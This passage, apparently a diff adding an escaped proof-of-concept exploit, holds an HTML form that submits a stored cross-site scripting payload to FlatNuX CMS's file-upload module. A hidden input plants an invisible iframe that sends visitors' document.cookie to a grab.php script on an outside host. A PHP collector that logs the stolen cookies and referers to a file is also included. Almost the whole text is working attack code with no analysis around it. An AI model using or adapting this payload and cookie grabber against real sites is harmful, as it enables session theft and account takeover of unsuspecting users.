@@ -1,0 +1,19 @@
+d&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form enctype=&quot;multipart/form-data&quot; action=&quot;http://www.example.com/flatnux/index.php?mod=08_Files&amp;amp;opmod=insertrecord&quot; method=&quot;POST&quot;&gt;
+titolo*&lt;input  size =&quot;20&quot;  style=&quot;visibility:hidden;&quot; value=&quot;filex &amp;lt;iframe  width=&amp;quot;0&amp;quot; height=&amp;quot;0&amp;quot; style=&amp;quot;visibility:hidden;&amp;quot; src=&amp;quot;javascript:window.location=&amp;apos;http://www.example.com/grab.php?cmd=&amp;apos;+document.cookie;&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&quot; name=&quot;name&quot; type=&quot;text&quot; /&gt;&lt;br /&gt;
+&lt;textarea title=&quot;Inserisci qui la descrizione&quot; cols=&quot;80&quot;  rows=&quot;10&quot;  name=&quot;description&quot; style=&quot;visibility:hidden;&quot; &gt;&lt;/textarea&gt;&lt;br /&gt;
+Immagine&lt;input  size=&quot;20&quot; name=&quot;foto1&quot; type=&quot;file&quot; style=&quot;visibility:hidden;&quot; /&gt;&lt;br /&gt;
+File&lt;input  size=&quot;20&quot; name=&quot;file&quot; type=&quot;file&quot; style=&quot;visibility:hidden;&quot; /&gt;&lt;br /&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Zic&quot;&gt;
+&lt;/form&gt;
+&lt;/body&gt;&lt;/html&gt;
+&lt;!-- grab.php
+&lt;?php $data = $_GET[&#039;cmd&#039;];
+$date=date(&quot;j F, Y, g:i a&quot;);
+$referer=$_SERVER[&#039;HTTP_REFERER&#039;];
+$fh = fopen(&quot;cookie.txt&quot;,&#039;a+&#039;);
+fwrite($fh, $referer . &quot; / &quot; . $data.&quot;\n&quot;.$date.&quot;\n&quot;);
+fclose($fh);
+?&gt;
